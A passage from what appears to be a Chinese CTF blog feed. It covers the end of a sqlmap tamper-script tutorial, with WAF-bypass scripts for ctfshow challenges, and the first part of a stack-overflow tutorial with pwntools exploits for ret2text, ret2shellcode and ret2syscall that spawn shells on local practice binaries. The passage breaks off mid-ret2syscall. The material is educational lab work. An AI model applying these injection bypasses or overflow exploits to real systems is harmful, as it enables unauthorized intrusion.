-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.convert <span class="keyword">import</span> encodeBase64</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;我是提示哦，这个tamper的作用是进行base64编码&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encodeBase64(payload, binary=<span class="literal">False</span>) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br></pre></td></tr></table></figure>
-<p>然后在tamper文件夹下保存成<code>dotast.py</code>，以<code>--tamper=dotast</code>的方式引用<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/sqlmap-tamper%E7%BC%96%E5%86%99%E5%88%9D%E4%BD%93%E9%AA%8C/R52GSK9JAVUG_KVAVRKAR62.png" alt=""><br>
-可以看到弹出了我们编写的提示</p>
-<h3 id="tamper"><a class="header-anchor" href="#tamper">¶</a>tamper</h3>
-<p>tamper函数是整个tamper脚本的核心，你想实现的功能都写在此函数里边。他有两个参数，一个是payload，一个是kwargs。payload是sqlmap的注入payload，想要bypass绕过就对此修改；kwargs是对于http头部的修改。</p>
-<h2 id="编写案例"><a class="header-anchor" href="#编写案例">¶</a>编写案例</h2>
-<h3 id="案例一"><a class="header-anchor" href="#案例一">¶</a>案例一</h3>
-<p>这里举例ctfshow的web208题<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/sqlmap-tamper%E7%BC%96%E5%86%99%E5%88%9D%E4%BD%93%E9%AA%8C/A_O%6028%2499%605SCVX%25ND9%28193.png" alt=""></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="comment">// $id = str_replace(&#x27;select&#x27;, &#x27;&#x27;, $id);</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ /&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-<p>可以看到waf的逻辑是ban了小写select和空格,我们编写对应绕过的tamper脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;绕过小写select和空格&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;把空格替换成注释符绕过&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> payload[i]== <span class="string">&quot; &quot;</span>:</span><br><span class="line">            result +=<span class="string">&quot;/**/&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result +=payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;小写替换成大写,这一步可以不用，因为slqmap默认payload就是大写的&quot;&quot;&quot;</span></span><br><span class="line">    result = result.replace(<span class="string">&quot;select&quot;</span>,<span class="string">&quot;SELECT&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>我们再引入编写好的<code>dotast.py</code><br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/sqlmap-tamper%E7%BC%96%E5%86%99%E5%88%9D%E4%BD%93%E9%AA%8C/IA%5DK%5D0YW2%28I4NOF3O_P%7B86S.png" alt=""></p>
-<h3 id="案例二"><a class="header-anchor" href="#案例二">¶</a>案例二</h3>
-<p>再举例ctfshow的web210题<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/sqlmap-tamper%E7%BC%96%E5%86%99%E5%88%9D%E4%BD%93%E9%AA%8C/F5FJ61UXLCJJ%7DAS9DKP10%5BM.png" alt=""><br>
-waf逻辑如下</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对查询字符进行解密</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strrev(base64_decode(strrev(base64_decode(<span class="variable">$id</span>))));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-<p>可以看见是套娃的base64编码和字符串反转，我们按照他的逻辑反着写tamper脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;别套了别套了&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = retVal.encode()</span><br><span class="line">        retVal = retVal[::-<span class="number">1</span>]</span><br><span class="line">        retVal = base64.b64encode(retVal)</span><br><span class="line">        retVal = retVal[::-<span class="number">1</span>]</span><br><span class="line">        retVal = base64.b64encode(retVal)</span><br><span class="line">        retVal = retVal.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
-<p>然后再引入写好的tamper脚本<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/sqlmap-tamper%E7%BC%96%E5%86%99%E5%88%9D%E4%BD%93%E9%AA%8C/2J%60XSKK%25_8G2R%5B%40QHZ5%299ES.png" alt=""></p>
-<h2 id="结语"><a class="header-anchor" href="#结语">¶</a>结语</h2>
-<p>道阻且长，加油吧！</p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pwn新手入门之栈溢出</title>
-    <url>/posts/54640/</url>
-    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
-<p>国庆假期打算学学pwn，文章内容主要是跟着 ctfwiki 一路学习下来。</p>
-<h2 id="栈的介绍"><a class="header-anchor" href="#栈的介绍">¶</a>栈的介绍</h2>
-<p>什么是栈，相信修过数据结构的同学们应该都了解清楚了。栈是一种先进后出的数据结构，其操作主要有入栈(push)和出栈(pop)两种操作，如下图所示<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/misc/stack.png" alt=""><br>
-在高级语言运行时会转换为汇编语言，而汇编语言运行的过程中，使用栈的数据结构，用于保存函数的调用信息和局部变量。在学习栈时需要注意 <strong>程序的栈是从进程地址空间的高地址向低地址增长</strong></p>
-<h2 id="栈溢出原理"><a class="header-anchor" href="#栈溢出原理">¶</a>栈溢出原理</h2>
-<p>栈溢出指的是向栈中某个变量写入的字节数超过了这个变量本身所申请的字节数，因此导致了与其相邻的栈中的变量的值被改变。栈溢出漏洞轻则导致程序的崩溃，重则导致攻击者可以控制程序的执行流程。理解概念后，就可以梳理清楚栈溢出漏洞的前提</p>
-<blockquote>
-<ul>
-<li>程序必须向栈上写入数据。</li>
-<li>写入的数据大小没有被良好地控制。</li>
-</ul>
-</blockquote>
-<p>最经典的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址（当然这个控制地址必须有可执行的权限），我们以一个例子来呈现</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123; <span class="built_in">puts</span>(<span class="string">&quot;flag&#123;208f1b1289da972682cbc81c8684fcc8&#125;&quot;</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>首先将该文件进行编译</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie stack1.c -o stack1</span><br></pre></td></tr></table></figure>
-<p>gcc编译指令中，<code>-m32</code>表示生成32位程序；<code>-fno-stack-protector</code>指的是不开始堆栈溢出保护，即不生成canary；<code>-no-pie</code>表示关闭PIE，避免基址被打乱，生成后用 <strong>checksec</strong> 检查编译出的程序PIE是否关闭<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/misc/S%7D%60M%7DZUMF%7D13%5DUBA%289R0NQN.png" alt=""><br>
-从图中可以看出，在编译程序的时候就提醒了我们<code>gets</code>函数是一个危险函数。因为它不检查输入的字符串长度，而是以回车来判断结束，因此容易导致栈溢出漏洞的产生。</p>
-<p>接着上面说的 PIE 保护，实质上，linux系统存在地址空间分布随机化（ASLR）机制，简单说就是即使可执行文件开启了 PIE 保护，还需要系统来开启 ASLR 才会真正打乱基址，否则依旧会加载在一个固定的基址上<br>
-我们可以通过<code>cat /proc/sys/kernel/randomize_va_space</code>来查看ASLR启动与否</p>
-<blockquote>
-<ul>
-<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
-<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
-<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
-</ul>
-</blockquote>
-<p>我们通过<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>来关闭ASLR</p>
-<p>接下来，我们将生成的可执行文件导入到 ida 进行查看，在main函数中会进入到 <strong>vulnerable()</strong> 函数<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/misc/%25%29_I4VHXY%40W%29%29O%60%40_DMU%5DPK.png" alt=""><br>
-双击<code>char s</code>，可以看到栈空间大小为<code>0x14</code>，到函数的返回值为<code>0x4-(-0x14)=0x18</code>，也就是只需要18个字节，我们就可以覆盖返回地址的内容。<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/misc/E%5DSFORK4P1NSS%7D__O%28_Q%2533.png" alt=""><br>
-我们知道函数的调用过程是，当子函数执行完毕，就会把主函数下一个命令的地址出栈并赋值给 EIP 寄存器，随后 EIP 寄存器就会去该地址执行。而我们在ida中可以看到含有 flag 的 <strong>success</strong> 函数地址为<code>0x08048456</code>，所以我们exp如下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./stack1&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>+p32(<span class="number">0x08048456</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/misc/%286AY1M%29%289_F%2490_0CM091HX.png" alt=""></p>
-<p>成功执行 <strong>success</strong> 函数获取到flag</p>
-<h2 id="基本ROP"><a class="header-anchor" href="#基本ROP">¶</a>基本ROP</h2>
-<blockquote>
-<p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在 <strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong> 所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
-</blockquote>
-<p>常用的汇编指令如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MOV %src %dest :把数据从源地放到目的地</span><br><span class="line"></span><br><span class="line">push：从栈中取出一个元素</span><br><span class="line"></span><br><span class="line">POP：往栈中压入一个元素</span><br><span class="line"></span><br><span class="line">call：将当前的指令指针EIP(该指针指向紧接在call指令后的下条指令)压入堆栈</span><br><span class="line"></span><br><span class="line">ret：从栈顶弹出返回地址(之前call指令保存的下条指令地址)到EIP寄存器中，程序转到该地址处继续执行(此时ESP指向进入函数时的第一个参数)</span><br></pre></td></tr></table></figure>
-<p>ROP，其核心在于利用了指令集中的ret指令，改变了指令流的执行顺序。ROP攻击一般需要满足如下条件</p>
-<blockquote>
-<ul>
-<li>程序存在溢出，并且可以控制返回地址。</li>
-<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>
-</ul>
-</blockquote>
-<p>但是如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了</p>
-<h3 id="ret2text"><a class="header-anchor" href="#ret2text">¶</a>ret2text</h3>
-<blockquote>
-<p>ret2text是一种控制程序执行程序本身已有的的代码的攻击方式，我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP</p>
-</blockquote>
-<p>点击下载文件：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a><br>
-首先使用<code>checksec</code>检查文件，发现是32位程序，且只开启了NX保护（shellcode不可执行）<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/RO5E0%250_W%609%5BCOZPIKL546G.png" alt=""><br>
-拖进 ida 中观察，main 函数使用了gets</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>并且还有一个 secure() 函数，其中含有<code>/bin/sh</code><br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/0P19P_C1Y%40RIV2%60F%40BVPG4G.png" alt=""><br>
-其地址为<code>0x0804863A</code>，接着就是计算 s 相对于返回地址的偏移，首先打开 gdb 运行文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb ret2text</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/60TFV9HH%5DGCNT8H1%24DO%249UB.png" alt="">接着另起一个窗口使用 cyclic 工具生成字符，比如这里生成150的字符</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cyclic 150</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/9CXS85B9OPKNQTQEW30X7RD.png" alt=""><br>
-然后放到gdb中回车<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/%29F%7DU3ZSNATF6FLKBA7D8C0Y.png" alt=""><br>
-可以看到报错的地址为<code>0x62616164</code><br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/%7D~2AK6VECS04%29SP9_58GX%28D.png" alt=""><br>
-然后用 cyclic 计算偏移大小为112<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/2%25%5BU%7D%5DS%25S%409TGB%5D%24Y8ZR_%7D4.png" alt=""><br>
-所以exp如下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(<span class="number">0x0804863A</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/7GC4%40JQ0RUJ%24VZJ9RO18%7BQQ.png" alt=""></p>
-<h3 id="ret2shellcode"><a class="header-anchor" href="#ret2shellcode">¶</a>ret2shellcode</h3>
-<blockquote>
-<p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p>
-</blockquote>
-<p>在栈溢出的基础上，如果要执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限<br>
-点击下载：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a><br>
-首先使用 checksec 检查文件<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2shellcode/%5BO1EC%5B_4YCU%5DGRI%7BG6%28B%2861.png" alt=""><br>
-是一个32位程序，并且几乎没有什么保护，拖进 ida 中按F5查看 mian 函数</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, &amp;s, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>使用了 gets，存在基本的栈溢出漏洞，此外还将字符串 s 复制到了 buf2，双击buf2<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2shellcode/5L3_12Y%7B_BWNCENC8XN%5B3%298.png" alt=""><br>
-可以看到 buf2 在 bss 段上，地址为<code>0x0804A080</code>，使用 gdb 调试查看该段是否有可执行的权限，依次执行命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb ret2shellcode  #使用gdb</span><br><span class="line">b main             #在main下断点</span><br><span class="line">r                  #运行程序</span><br><span class="line">vmmap              #查看栈、bss段是否可以执行</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2shellcode/E1T%251H66ID%5DH2O_4J_C%60J%407.png" alt=""><br>
-可以看到该段是具有可执行的权限，而<code>0x0804A080</code>正好在此区间</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0804a000 0x0804b000 rwxp	&#x2F;home&#x2F;hacker&#x2F;Desktop&#x2F;gongfangword-pwn&#x2F;ret2shellcode</span><br></pre></td></tr></table></figure>
-<p>所以我们可以控制程序读取 shellcode 之后，执行 bss 段处的 shellcode，首先和上面 <code>ret2text</code>一样的办法先计算出偏移<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2shellcode/8%29WKTI%7DS%295_A6ZNP%24_%25%7D%5B%5BD.png" alt=""><br>
-得到112，然后开始写exp，其中 shellcode 可以由 pwntools 生成</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line"><span class="comment">#由pwntools生成shellcode，然后通过asm转换成字节码</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#ljust是向左对齐填充字节，这里是将shellcode填充完后，不足112长度的地方用a来填充</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;a&#x27;</span>) + p32(<span class="number">0x0804A080</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>运行后成功获取交互式shell<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2shellcode/9QD%606TJT%2912MR%24UM1YQHCOB.png" alt=""></p>
-<h3 id="ret2syscall"><a class="header-anchor" href="#ret2syscall">¶</a>ret2syscall</h3>
-<p>ret2syscall，简单来说就是控制程序执行系统调用获取 shell，继续以题目为例<br>
-点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a><br>
-首先使用 checksec 检查文件<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/GE3SE5C%7DBY%7BS2%28ND%40%7DKZ%7D0K.png" alt=""><br>
-32位程序，并且开启了NX保护（即shellcode不可执行)，ida 查看依然是一个典型栈溢出</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
-<p>由于我们不能像之前一样直接利用程序中的某段代码或者自己填写代码拿到shell，所以需要利用程序中的 gadgets 来获得 shell<br>
-首先我们需要了解一下 Linux 的系统调用知识点：</p>
-<blockquote>
-<p>Linux的系统调用通过 int 80h 实现，并且用系统调用号来区分入口的函数</p>
-<p>调用流程如下：<br>
-1、将系统调用编号存入 eax 寄存器中<br>
-2、将函数的参数存入其他通用的寄存器（ebx、ecx、edx…）<br>
-2、触发 0x80 号中断</p>
-</blockquote>
-<p>比如我们通过系统调用执行：<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>，如图所示<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/im.png" alt=""><br>
-首先计算栈空间偏移，用之前提到的办法计算<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/%5D%29JXV8U_O%5DQ7YBCM6X91%281G.png" alt=""><br>
-值求得为112，所以需要填充的空间大小为112<br>
-接着需要知道 <code>execve</code> 的系统调用号（32位)</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd_32.h | grep execve</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/%7BRU%40%40BJVQ7KHNC_WP6F7V_M.png" alt=""><br>
-可以看到值为11，转换为16进制就是<code>0xb</code>，接着我们使用 <strong>ROPgadget</strong> 工具开始寻找含有<code>pop eax</code>的指令地址</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#39;pop|ret&#39; | grep &#39;eax&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/R71ZMG5M21Y%282V%40Z0%29UJFRP.png" alt=""><br>
-上述几个都可以控制 eax 寄存器，我们这里选取第二个，即地址为<code>0x080bb196</code><br>
-接着寻找<code>pop ebx</code>的指令地址</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#39;pop|ret&#39; | grep &#39;ebx&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/%25OOMLA%28_W4YBE%25M8N%28BD%7B%404.png" alt=""><br>
